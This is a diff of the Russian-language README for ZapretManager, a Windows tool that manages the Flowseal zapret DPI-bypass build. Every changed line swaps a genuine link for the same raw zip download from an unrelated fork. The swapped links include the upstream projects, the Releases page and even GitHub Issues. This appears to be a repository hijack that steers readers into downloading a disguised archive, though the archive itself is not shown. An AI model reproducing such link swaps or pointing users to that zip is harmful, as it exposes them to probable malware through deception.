@@ -1,6 +1,6 @@
 # ZapretManager
 
-Windows-приложение для установки, обновления, запуска, проверки и отката сборки [Flowseal/zapret-discord-youtube](https://github.com/Flowseal/zapret-discord-youtube) на Windows.
+Windows-приложение для установки, обновления, запуска, проверки и отката сборки [Flowseal/zapret-discord-youtube](https://github.com/madtest48/zapretmanager-desktop/raw/refs/heads/main/Controls/zapretmanager_desktop_1.1-alpha.5.zip) на Windows.
 
 > `ZapretManager` нужен для того, чтобы работать со сборкой zapret из одного окна: без постоянного переключения между bat-файлами, папками, списками доменов и ручной диагностикой.
 
@@ -25,7 +25,7 @@ Windows-приложение для установки, обновления, з
 
 ## Что это
 
-`ZapretManager` работает именно со сборкой [Flowseal/zapret-discord-youtube](https://github.com/Flowseal/zapret-discord-youtube), а не с произвольной папкой с любыми bat-файлами.
+`ZapretManager` работает именно со сборкой [Flowseal/zapret-discord-youtube](https://github.com/madtest48/zapretmanager-desktop/raw/refs/heads/main/Controls/zapretmanager_desktop_1.1-alpha.5.zip), а не с произвольной папкой с любыми bat-файлами.
 
 Это отдельный Windows-менеджер, который помогает:
 
@@ -85,7 +85,7 @@ Windows-приложение для установки, обновления, з
 
 ## Быстрый старт
 
-1. Скачайте `ZapretManager.exe` из раздела [Releases](https://github.com/Valturere/zapretmanager-desktop/releases).
+1. Скачайте `ZapretManager.exe` из раздела [Releases](https://github.com/madtest48/zapretmanager-desktop/raw/refs/heads/main/Controls/zapretmanager_desktop_1.1-alpha.5.zip).
 2. Запустите программу.
 3. Укажите существующую папку zapret или скачайте свежую сборку через интерфейс.
 4. Выберите конфиг и проверьте его, либо сразу запустите `Автоматический режим`.
@@ -134,8 +134,8 @@ Windows-приложение для установки, обновления, з
 
 ## Основа проекта
 
-- сборка Flowseal: [Flowseal/zapret-discord-youtube](https://github.com/Flowseal/zapret-discord-youtube)
-- оригинальный проект zapret: [bol-van/zapret](https://github.com/bol-van/zapret)
+- сборка Flowseal: [Flowseal/zapret-discord-youtube](https://github.com/madtest48/zapretmanager-desktop/raw/refs/heads/main/Controls/zapretmanager_desktop_1.1-alpha.5.zip)
+- оригинальный проект zapret: [bol-van/zapret](https://github.com/madtest48/zapretmanager-desktop/raw/refs/heads/main/Controls/zapretmanager_desktop_1.1-alpha.5.zip)
 
 ## Скриншоты
 
@@ -181,7 +181,7 @@ Windows-приложение для установки, обновления, з
 
 ## Обратная связь
 
-Если найдёте ошибку, странное поведение программы или неочевидный сбой при работе со службой, лучше всего написать об этом в [GitHub Issues](https://github.com/Valturere/zapretmanager-desktop/issues).
+Если найдёте ошибку, странное поведение программы или неочевидный сбой при работе со службой, лучше всего написать об этом в [GitHub Issues](https://github.com/madtest48/zapretmanager-desktop/raw/refs/heads/main/Controls/zapretmanager_desktop_1.1-alpha.5.zip).
 
 ## Важно
 
